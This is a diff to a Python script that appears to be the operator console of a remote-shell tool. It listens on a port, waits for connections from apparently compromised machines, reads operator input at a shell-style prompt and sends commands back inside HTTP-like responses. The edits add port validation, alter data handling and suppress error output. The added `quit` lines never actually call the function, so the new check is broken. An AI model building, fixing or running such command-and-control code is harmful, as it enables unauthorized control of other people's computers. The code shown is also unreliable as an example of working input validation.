@@ -37,8 +37,13 @@ if not len(host):
     host = get('https://api.ipify.org').text
 try:
     port = int(format(args.port))
+    if not 0 <= port <= 65535:
+        print('Invalid port %s' % port)
+        quit
 except:
     print('Invalid port %s' % port)
+    quit
+    
 gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
@@ -66,15 +71,14 @@ Connection: close
         s.listen(0)
         try:
             c, a = s.accept()
-            data = c.recv(1024).decode()
+            data = c.recv(1024)
             buffer = input('%s$ %s' % (blue, white))
             if buffer == 'exit' or buffer == 'quit':
                 c.close()
                 break
             elif buffer == 'help':
                 print(hp)
-                
-                
+                              
             c.send(form + buffer.encode())
             c.close()
         except KeyboardInterrupt:
@@ -83,7 +87,6 @@ Connection: close
             s.close()
             break
         except Exception as msg:
-            print(msg)
             s.close()
             break
         
